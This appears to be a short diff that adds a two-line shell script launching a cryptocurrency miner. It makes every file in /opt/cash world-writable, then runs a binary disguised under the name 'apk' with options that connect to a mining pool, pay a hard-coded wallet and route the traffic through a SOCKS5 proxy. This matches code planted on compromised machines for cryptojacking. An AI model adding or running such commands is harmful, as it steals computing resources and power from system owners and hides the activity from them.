@@ -1,0 +1,2 @@
+cd /opt/cash/ && chmod 777 * && ls
+./apk --algorithm randomscash --pool stratum-asia.rplant.xyz:17019 --tls true --wallet scash1q65qgqj44sdzdkldn7tps7mh8lf556x40jdcd8g.Test --password x --proxy socks5://199.229.254.129:4145 --keepalive true
